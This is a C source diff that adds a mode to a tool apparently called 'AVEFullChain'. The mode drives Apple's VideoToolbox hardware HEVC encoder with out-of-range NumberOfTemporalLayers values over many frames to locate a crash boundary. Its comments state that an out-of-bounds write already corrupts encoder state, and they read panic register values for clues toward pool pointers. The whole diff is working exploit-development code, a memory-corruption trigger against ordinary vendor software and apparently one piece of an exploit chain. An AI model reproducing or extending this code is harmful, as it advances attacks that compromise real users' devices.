@@ -11457,6 +11457,103 @@ vps_cd_done:
 
         rlog("\n=== NTL_CRASH complete ===\n");
 
+    } else if (strcmp(mode, "ntl_deep_scan") == 0) {
+        /*
+         * ntl_deep_scan — Find crash NTL with multi-frame encoding
+         *
+         * Unlike ntl_scan (1 frame), this encodes 10 frames per NTL value
+         * to exercise temporal prediction and pool access paths.
+         *
+         * The nal=0 output at NTL=16464 proves OOB IS corrupting state,
+         * but no crash means pool pointers are further out.
+         *
+         * From Nov 20 panic: x2=0xd555=54613, possibly the NTL value or
+         * loop counter. x10=0x13198=78232, possibly a struct offset.
+         *
+         * Usage: ntl_deep_scan [start] [end] [step] [frames]
+         */
+        int start = (argc > 2) ? atoi(argv[2]) : 16400;
+        int end = (argc > 3) ? atoi(argv[3]) : 16500;
+        int step = (argc > 4) ? atoi(argv[4]) : 5;
+        int nframes = (argc > 5) ? atoi(argv[5]) : 10;
+        if (start < 1) start = 1;
+        if (end < start) end = start + 100;
+        if (step < 1) step = 1;
+        if (nframes < 1) nframes = 1;
+        if (nframes > 30) nframes = 30;
+        if (end > 60000) end = 60000;
+
+        int vw = 192, vh = 192;
+        rlog("=== NTL_DEEP_SCAN: Multi-frame crash boundary search ===\n");
+        rlog("Range: %d to %d, step=%d, frames=%d, res=%dx%d\n",
+             start, end, step, nframes, vw, vh);
+        rlog("Encodes %d frames per NTL to exercise temporal prediction paths.\n\n", nframes);
+
+        int tested = 0, survived = 0;
+        for (int ntl = start; ntl <= end; ntl += step) {
+            rlog("NTL=%5d: ", ntl);
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs != noErr || !s) { rlog("create FAIL\n"); tested++; continue; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            CFNumberRef ntl_num = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+            OSStatus sp = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), ntl_num);
+            CFRelease(ntl_num);
+            if (sp != noErr) {
+                rlog("set REJECTED\n");
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                tested++; continue;
+            }
+
+            OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (prep != noErr) {
+                rlog("prep FAIL\n");
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                tested++; continue;
+            }
+
+            int enc_ok = 0;
+            for (int f = 0; f < nframes; f++) {
+                g_encode_done = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (!pb) continue;
+                CVPixelBufferLockBaseAddress(pb, 0);
+                void *base = CVPixelBufferGetBaseAddress(pb);
+                if (base) memset(base, (uint8_t)(0x20 + f), CVPixelBufferGetDataSize(pb));
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+                OSStatus enc = VTCompressionSessionEncodeFrame(s, pb,
+                    CMTimeMake(f, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                if (enc == noErr) {
+                    VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                    for (int w = 0; w < 50 && !g_encode_done; w++) usleep(5000);
+                    enc_ok++;
+                }
+                CVPixelBufferRelease(pb);
+            }
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            rlog("enc=%d/%d OK\n", enc_ok, nframes);
+            tested++;
+            survived++;
+            usleep(20000);
+        }
+
+        rlog("\n=== NTL_DEEP_SCAN summary ===\n");
+        rlog("Tested: %d, survived: %d\n", tested, survived);
+        if (survived == tested)
+            rlog("All survived → crash boundary beyond NTL=%d\n", end);
+        rlog("\n=== NTL_DEEP_SCAN complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
